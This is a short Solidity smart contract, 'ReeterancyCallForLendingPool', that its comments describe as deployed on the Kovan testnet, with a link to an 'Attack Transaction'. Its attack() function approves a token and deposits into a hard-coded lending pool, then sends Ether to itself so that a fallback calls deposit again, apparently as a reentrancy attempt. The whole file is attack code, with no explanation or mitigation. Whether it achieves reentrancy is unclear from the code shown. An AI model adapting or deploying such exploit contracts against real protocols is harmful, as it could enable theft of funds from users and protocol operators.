pragma solidity 0.6.12;

// Deployed at https://kovan.etherscan.io/address/0x090827268693f002e0F9b6976dDBCf34b3e40C51
// Attack Transaction at https://kovan.etherscan.io/tx/0x96c41625872b757a98a4b0d6e646ac6bbb0abc92c694996ece82e1df529a03b0

interface IERC20 {
    function approve(address spender, uint256 amount) external;
}

interface LendingPool {
    function deposit(
        address asset,
        uint256 amount,
        address onBehalfOf,
        uint16 referralCode
    ) external;
}

contract ReeterancyCallForLendingPool {
    // Fallback is called when DepositFunds sends Ether to this contract.
    fallback() external payable {
        LendingPool(0x3526a2fe5dA32d0f0814086848628bF12A1E4417).deposit(
            0xe22da380ee6B445bb8273C81944ADEB6E8450422,
            1,
            0x7C71a3D85a8d620EeaB9339cCE776Ddc14a8129C,
            0
        );
    }

    function attack() external payable {
        IERC20(0xe22da380ee6B445bb8273C81944ADEB6E8450422).approve(
            0x3526a2fe5dA32d0f0814086848628bF12A1E4417,
            10000000
        );
        LendingPool(0x3526a2fe5dA32d0f0814086848628bF12A1E4417).deposit(
            0xe22da380ee6B445bb8273C81944ADEB6E8450422,
            1,
            0x7C71a3D85a8d620EeaB9339cCE776Ddc14a8129C,
            0
        );
        (bool isSent, ) = payable(address(this)).call{value: msg.value}('');
        require(isSent, 'Failed to send Ether');
    }
}